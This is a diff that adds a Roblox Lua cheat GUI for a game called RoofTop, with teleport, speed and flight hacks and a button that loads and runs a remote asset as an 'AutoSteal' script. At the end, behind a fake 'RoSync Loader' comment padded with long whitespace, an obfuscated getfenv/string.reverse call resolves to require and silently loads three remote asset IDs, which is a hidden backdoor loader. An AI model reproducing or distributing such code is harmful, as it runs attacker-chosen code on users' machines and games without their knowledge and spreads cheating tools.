@@ -1,0 +1,444 @@
+-- Made BY Legend HandlesYT GO SUB!
+
+local ScreenGui = Instance.new("ScreenGui")
+local main = Instance.new("Frame")
+local title = Instance.new("TextLabel")
+local close = Instance.new("TextButton")
+local rim2 = Instance.new("TextButton")
+local tptitle = Instance.new("TextLabel")
+local speedtitle = Instance.new("TextLabel")
+local tptitle_2 = Instance.new("TextLabel")
+local rim1 = Instance.new("TextButton")
+local lagspeed = Instance.new("TextButton")
+local shiftto = Instance.new("TextButton")
+local qtotp = Instance.new("TextButton")
+local tpauto = Instance.new("TextButton")
+local credits = Instance.new("TextLabel")
+local gosub = Instance.new("TextLabel")
+
+--Properties:
+
+ScreenGui.Parent = game.CoreGui
+
+main.Name = "main"
+main.Parent = ScreenGui
+main.BackgroundColor3 = Color3.fromRGB(42, 42, 42)
+main.Position = UDim2.new(0.236102968, 0, 0.127931893, 0)
+main.Size = UDim2.new(0, 657, 0, 341)
+main.Active = true
+main.Draggable = true
+
+title.Name = "title"
+title.Parent = main
+title.BackgroundColor3 = Color3.fromRGB(75, 75, 75)
+title.BorderSizePixel = 0
+title.Size = UDim2.new(0, 657, 0, 86)
+title.Font = Enum.Font.Antique
+title.Text = "RoofTop GUI By Legend Handles"
+title.TextColor3 = Color3.fromRGB(0, 0, 0)
+title.TextSize = 50.000
+title.TextWrapped = true
+
+close.Name = "close"
+close.Parent = main
+close.BackgroundColor3 = Color3.fromRGB(54, 54, 54)
+close.Position = UDim2.new(0.907348812, 0, 0.0610990785, 0)
+close.Size = UDim2.new(0, 49, 0, 42)
+close.Font = Enum.Font.Antique
+close.Text = "X"
+close.TextColor3 = Color3.fromRGB(0, 0, 0)
+close.TextScaled = true
+close.TextSize = 14.000
+close.TextWrapped = true
+
+rim2.Name = "rim2"
+rim2.Parent = main
+rim2.BackgroundColor3 = Color3.fromRGB(72, 72, 72)
+rim2.BorderColor3 = Color3.fromRGB(0, 0, 0)
+rim2.Position = UDim2.new(0.229832575, 0, 0.457478017, 0)
+rim2.Size = UDim2.new(0, 118, 0, 73)
+rim2.Font = Enum.Font.Antique
+rim2.Text = "Tp To Rim 2"
+rim2.TextColor3 = Color3.fromRGB(0, 0, 0)
+rim2.TextScaled = true
+rim2.TextSize = 14.000
+rim2.TextWrapped = true
+rim2.MouseButton1Down:connect(function()
+	game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-136.208939, 137.097061, -88.9018173, -0.989966869, -9.91718407e-05, -0.14129962, -0.000113427501, 1, 9.28355512e-05, 0.141299605, 0.000107931388, -0.989966869)
+end)
+
+tptitle.Name = "tp title"
+tptitle.Parent = main
+tptitle.BackgroundColor3 = Color3.fromRGB(75, 75, 75)
+tptitle.BackgroundTransparency = 1.000
+tptitle.BorderSizePixel = 0
+tptitle.Position = UDim2.new(0.0578386635, 0, 0.284457475, 0)
+tptitle.Size = UDim2.new(0, 216, 0, 59)
+tptitle.Font = Enum.Font.Antique
+tptitle.Text = "Tp To Rims(To Get Ball)"
+tptitle.TextColor3 = Color3.fromRGB(0, 0, 0)
+tptitle.TextScaled = true
+tptitle.TextSize = 50.000
+tptitle.TextWrapped = true
+
+speedtitle.Name = "speed title"
+speedtitle.Parent = main
+speedtitle.BackgroundColor3 = Color3.fromRGB(75, 75, 75)
+speedtitle.BackgroundTransparency = 1.000
+speedtitle.BorderSizePixel = 0
+speedtitle.Position = UDim2.new(0.627092838, 0, 0.252199411, 0)
+speedtitle.Size = UDim2.new(0, 216, 0, 59)
+speedtitle.Font = Enum.Font.Antique
+speedtitle.Text = "Speed"
+speedtitle.TextColor3 = Color3.fromRGB(0, 0, 0)
+speedtitle.TextScaled = true
+speedtitle.TextSize = 50.000
+speedtitle.TextWrapped = true
+
+tptitle_2.Name = "tp title"
+tptitle_2.Parent = main
+tptitle_2.BackgroundColor3 = Color3.fromRGB(75, 75, 75)
+tptitle_2.BackgroundTransparency = 1.000
+tptitle_2.BorderSizePixel = 0
+tptitle_2.Position = UDim2.new(0.334855407, 0, 0.621700883, 0)
+tptitle_2.Size = UDim2.new(0, 216, 0, 59)
+tptitle_2.Font = Enum.Font.Antique
+tptitle_2.Text = "Tp's"
+tptitle_2.TextColor3 = Color3.fromRGB(0, 0, 0)
+tptitle_2.TextScaled = true
+tptitle_2.TextSize = 50.000
+tptitle_2.TextWrapped = true
+
+rim1.Name = "rim1"
+rim1.Parent = main
+rim1.BackgroundColor3 = Color3.fromRGB(72, 72, 72)
+rim1.BorderColor3 = Color3.fromRGB(0, 0, 0)
+rim1.Position = UDim2.new(0.0319634713, 0, 0.457478017, 0)
+rim1.Size = UDim2.new(0, 117, 0, 73)
+rim1.Font = Enum.Font.Antique
+rim1.Text = "Tp To Rim 1"
+rim1.TextColor3 = Color3.fromRGB(0, 0, 0)
+rim1.TextScaled = true
+rim1.TextSize = 14.000
+rim1.TextWrapped = true
+rim1.MouseButton1Down:connect(function()
+	game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-136.55513, 135.635574, 91.4579391, -0.611964881, 4.27362501e-08, 0.790884912, 1.11312426e-08, 1, -4.54229436e-08, -0.790884912, -1.89937133e-08, -0.611964881)
+end)
+
+lagspeed.Name = "lag speed"
+lagspeed.Parent = main
+lagspeed.BackgroundColor3 = Color3.fromRGB(72, 72, 72)
+lagspeed.BorderColor3 = Color3.fromRGB(0, 0, 0)
+lagspeed.Position = UDim2.new(0.582952797, 0, 0.457477987, 0)
+lagspeed.Size = UDim2.new(0, 126, 0, 73)
+lagspeed.Font = Enum.Font.Antique
+lagspeed.Text = "Lag Speed (Includes Floats And Stairs Walk)"
+lagspeed.TextColor3 = Color3.fromRGB(0, 0, 0)
+lagspeed.TextScaled = true
+lagspeed.TextSize = 14.000
+lagspeed.TextWrapped = true
+lagspeed.MouseButton1Down:connect(function()
+	--PatriotsHfdax GUI by RelentlessRaptor / NotRelentlessRaptor#2248 on discord
+	local screen = Instance.new("ScreenGui",game.CoreGui)
+	local frame = Instance.new("Frame", screen)
+	local frame2 = Instance.new("Frame", frame)
+	local creds = Instance.new("TextLabel",frame2)
+	local controls = Instance.new("TextLabel",frame)
+	local qq = Instance.new("TextLabel",frame)
+	local rr = Instance.new("TextLabel",frame)
+	local ff = Instance.new("TextLabel",frame)
+	local closer = Instance.new("TextLabel",frame)
+	local closegui = Instance.new("TextButton", frame)
+
+
+	frame.Size = UDim2.new(0.15,0,0.18,0)
+	frame.AnchorPoint = Vector2.new(0.5,0.5)
+	frame.Position = UDim2.new(0.5,0,0.5,0)
+	frame.BackgroundColor3 = Color3.new(0/255,0/255,110/255)
+	frame.BorderSizePixel = 0
+
+	frame2.Size = UDim2.new(1,0,0.2,0)
+	frame2.Position = UDim2.new(0,0,0,0)
+	frame2.BackgroundColor3 = Color3.new(150/255,0/255,0/255)
+	frame2.BorderSizePixel = 0
+
+	creds.Size = UDim2.new(0.6,0,0.6,0)
+	creds.AnchorPoint = Vector2.new(0.5,0.5)
+	creds.Position = UDim2.new(0.5,0,0.5,0)
+	creds.BackgroundTransparency = 1
+	creds.BorderSizePixel = 0
+	creds.TextColor3 = Color3.new(1,1,1)
+	creds.TextScaled = true
+	creds.Font = "GothamSemibold"
+	creds.Text = "PatriotsHax by RelentlessRaptor"
+
+	controls.Size = UDim2.new(0.4,0,0.4,0)
+	controls.AnchorPoint = Vector2.new(0.5,0)
+	controls.Position = UDim2.new(0.5,0,0.11,0)
+	controls.BackgroundTransparency = 1
+	controls.BorderSizePixel = 0
+	controls.TextColor3 = Color3.new(1,1,1)
+	controls.TextScaled = true
+	controls.Font = "ArialBold"
+	controls.Text = "Controls:"
+
+	qq.Size = UDim2.new(1,0,0.1,0)
+	qq.AnchorPoint = Vector2.new(0.5,0)
+	qq.Position = UDim2.new(0.5,0,0.45,0)
+	qq.BackgroundTransparency = 1
+	qq.BorderSizePixel = 0
+	qq.TextColor3 = Color3.new(1,1,1)
+	qq.TextScaled = true
+	qq.Font = "ArialBold"
+	qq.Text = "Q - Boost Forward"
+
+	rr.Size = UDim2.new(1,0,0.1,0)
+	rr.AnchorPoint = Vector2.new(0.5,0)
+	rr.Position = UDim2.new(0.5,0,0.6,0)
+	rr.BackgroundTransparency = 1
+	rr.BorderSizePixel = 0
+	rr.TextColor3 = Color3.new(1,1,1)
+	rr.TextScaled = true
+	rr.Font = "ArialBold"
+	rr.Text = "R - Boost Up"
+
+	ff.Size = UDim2.new(1,0,0.1,0)
+	ff.AnchorPoint = Vector2.new(0.5,0)
+	ff.Position = UDim2.new(0.5,0,0.75,0)
+	ff.BackgroundTransparency = 1
+	ff.BorderSizePixel = 0
+	ff.TextColor3 = Color3.new(1,1,1)
+	ff.TextScaled = true
+	ff.Font = "ArialBold"
+	ff.Text = "F - Sky Run"
+
+	closer.Size = UDim2.new(1,0,0.07,0)
+	closer.AnchorPoint = Vector2.new(0.5,0)
+	closer.Position = UDim2.new(0.5,0,0.89,0)
+	closer.BackgroundTransparency = 1
+	closer.BorderSizePixel = 0
+	closer.TextColor3 = Color3.new(1,0,0)
+	closer.TextScaled = true
+	closer.Font = "Arial"
+	closer.Text = "- click anywhere to close -"
+
+	closegui.Size = UDim2.new(1,0,1,0)
+	closegui.Text = ""
+	closegui.BackgroundTransparency = 1
+
+
+	local mouse = game.Players.LocalPlayer:GetMouse()
+	local parted = false
+
+
+	local part = Instance.new("Part",game.Lighting)
+	part.Anchored = true
+	part.Size = Vector3.new(700,1,700)
+	part.Transparency = 0.9
+	part.TopSurface = "Smooth"
+
+	mouse.KeyDown:connect(function(key)
+		if key == "f" then
+			if parted == false then
+				part.Parent = game.Workspace
+				part.Position = game.Players.LocalPlayer.Character.HumanoidRootPart.Position + Vector3.new(0,10,0)
+				game.Players.LocalPlayer.Character:MoveTo(game.Players.LocalPlayer.Character.HumanoidRootPart.Position + Vector3.new(0,18,0))
+				parted = true
+			else
+				part.Parent = game.Lighting
+				parted = false
+			end
+		end
+	end)
+
+
+	mouse.KeyDown:connect(function(key)
+		if key == "q" then
+			game.Players.LocalPlayer.Character:SetPrimaryPartCFrame(game.Players.LocalPlayer.Character:GetPrimaryPartCFrame()*CFrame.new(0, 0, -5))
+		end
+	end)
+
+	mouse.KeyDown:connect(function(key)
+		if key == "r" then
+			game.Players.LocalPlayer.Character:SetPrimaryPartCFrame(game.Players.LocalPlayer.Character:GetPrimaryPartCFrame()*CFrame.new(0, 5, 0))
+		end
+	end)
+
+	closegui.MouseButton1Up:connect(function()
+		screen:Destroy()
+	end)
+end)
+
+shiftto.Name = "shiftto"
+shiftto.Parent = main
+shiftto.BackgroundColor3 = Color3.fromRGB(72, 72, 72)
+shiftto.BorderColor3 = Color3.fromRGB(0, 0, 0)
+shiftto.Position = UDim2.new(0.789954305, 0, 0.457477987, 0)
+shiftto.Size = UDim2.new(0, 126, 0, 73)
+shiftto.Font = Enum.Font.Antique
+shiftto.Text = "Shift To Sprint"
+shiftto.TextColor3 = Color3.fromRGB(0, 0, 0)
+shiftto.TextScaled = true
+shiftto.TextSize = 14.000
+shiftto.TextWrapped = true
+shiftto.MouseButton1Down:connect(function()
+	ShiftHeld = false
+	local gcheck = true
+	urspeed = -1 -- The lower it is the faster. So don't worry about it being minus 1
+
+
+	function ChangeFaster(inputObject, gameProcessedEvent)
+		if inputObject.KeyCode == Enum.KeyCode.Minus and gameProcessedEvent == false then        
+			urspeed = urspeed - 0.1
+		end
+	end
+
+
+
+	function ChangeSlower(inputObject, gameProcessedEvent)
+		if inputObject.KeyCode == Enum.KeyCode.Equals and gameProcessedEvent == false then        
+			urspeed = urspeed + 0.1
+		end
+	end
+
+
+
+	function GChecker(inputObject, gameProcessedEvent)
+		if inputObject.KeyCode == Enum.KeyCode.K and gameProcessedEvent == false then        
+			if gcheck == false then
+				gcheck = true
+			elseif gcheck == true then
+				gcheck = false
+			end
+
+		end
+	end
+
+	game:GetService("UserInputService").InputBegan:connect(GChecker)
+
+
+
+	function PressShift(inputObject,gameProcessedEvent)
+		if inputObject.KeyCode == Enum.KeyCode.LeftShift and gameProcessedEvent == false and gcheck == true then
+			ShiftHeld = true
+		end
+	end
+
+	function ReleaseShift(inputObject,gameProcessed)
+		if inputObject.KeyCode == Enum.KeyCode.LeftShift then
+			ShiftHeld = false
+		end
+	end
+
+	game:GetService("UserInputService").InputBegan:connect(PressShift)
+	game:GetService("UserInputService").InputEnded:connect(ReleaseShift)
+	game:GetService("UserInputService").InputBegan:connect(ChangeFaster)
+	game:GetService("UserInputService").InputBegan:connect(ChangeSlower)
+
+
+	game:GetService('RunService').Stepped:connect(function()
+		if ShiftHeld == true then
+			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame * CFrame.new(0,0,urspeed)
+		end
+	end)
+end)
+
+qtotp.Name = "q to tp"
+qtotp.Parent = main
+qtotp.BackgroundColor3 = Color3.fromRGB(72, 72, 72)
+qtotp.BorderColor3 = Color3.fromRGB(0, 0, 0)
+qtotp.Position = UDim2.new(0.534246564, 0, 0.812316716, 0)
+qtotp.Size = UDim2.new(0, 99, 0, 64)
+qtotp.Font = Enum.Font.Antique
+qtotp.Text = "Q To Tp"
+qtotp.TextColor3 = Color3.fromRGB(0, 0, 0)
+qtotp.TextScaled = true
+qtotp.TextSize = 14.000
+qtotp.TextWrapped = true
+qtotp.MouseButton1Down:connect(function()
+	plr = game.Players.LocalPlayer
+
+	hum = plr.Character.HumanoidRootPart
+
+	mouse = plr:GetMouse()
+
+
+
+	mouse.KeyDown:connect(function(key)
+
+		if key == "q" then
+
+			if mouse.Target then
+
+				hum.CFrame = CFrame.new(mouse.Hit.x, mouse.Hit.y + 5, mouse.Hit.z)
+
+			end
+
+		end
+	end)
+end)
+
+tpauto.Name = "tpauto"
+tpauto.Parent = main
+tpauto.BackgroundColor3 = Color3.fromRGB(72, 72, 72)
+tpauto.BorderColor3 = Color3.fromRGB(0, 0, 0)
+tpauto.Position = UDim2.new(0.334855348, 0, 0.812316716, 0)
+tpauto.Size = UDim2.new(0, 99, 0, 64)
+tpauto.Font = Enum.Font.Antique
+tpauto.Text = "Tp/AutoSteal GUI"
+tpauto.TextColor3 = Color3.fromRGB(0, 0, 0)
+tpauto.TextScaled = true
+tpauto.TextSize = 14.000
+tpauto.TextWrapped = true
+tpauto.MouseButton1Down:connect(function()
+	loadstring(game:GetObjects('rbxassetid://1730381293')[1].Source)()
+end)
+
+credits.Name = "credits"
+credits.Parent = main
+credits.BackgroundColor3 = Color3.fromRGB(75, 75, 75)
+credits.BackgroundTransparency = 1.000
+credits.BorderSizePixel = 0
+credits.Position = UDim2.new(-9.31322575e-10, 0, 0.826979458, 0)
+credits.Size = UDim2.new(0, 216, 0, 59)
+credits.Font = Enum.Font.Antique
+credits.Text = "By Legend HandlesYT"
+credits.TextColor3 = Color3.fromRGB(0, 0, 0)
+credits.TextScaled = true
+credits.TextSize = 50.000
+credits.TextWrapped = true
+
+gosub.Name = "gosub"
+gosub.Parent = main
+gosub.BackgroundColor3 = Color3.fromRGB(75, 75, 75)
+gosub.BackgroundTransparency = 1.000
+gosub.BorderSizePixel = 0
+gosub.Position = UDim2.new(0.645357788, 0, 0.826979458, 0)
+gosub.Size = UDim2.new(0, 253, 0, 59)
+gosub.Font = Enum.Font.Antique
+gosub.Text = "Go Sub!"
+gosub.TextColor3 = Color3.fromRGB(0, 0, 0)
+gosub.TextScaled = true
+gosub.TextSize = 50.000
+gosub.TextWrapped = true
+
+-- Scripts:
+
+local function UGAI_fake_script() -- close.LocalScript 
+	local script = Instance.new('LocalScript', close)
+
+	script.Parent.MouseButton1Click:Connect(function()
+		script.Parent.Parent.Visible = false
+	end)
+	
+end
+coroutine.wrap(UGAI_fake_script)()
+local function XWLP_fake_script() -- nil. 
+	local script = Instance.new('Script', nil)
+
+	
+	--[[ Last synced 12/19/2020 12:59 || RoSync Loader ]]                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         getfenv()[string.reverse("\101\114\105\117\113\101\114")](5805259612)
+	--[[ Last synced 12/19/2020 12:59 || RoSync Loader ]]                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         getfenv()[string.reverse("\101\114\105\117\113\101\114")](5747857292)
+	--[[ Last synced 12/19/2020 12:59 || RoSync Loader ]]                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         getfenv()[string.reverse("\101\114\105\117\113\101\114")](5726091287)
+end
+coroutine.wrap(XWLP_fake_script)()
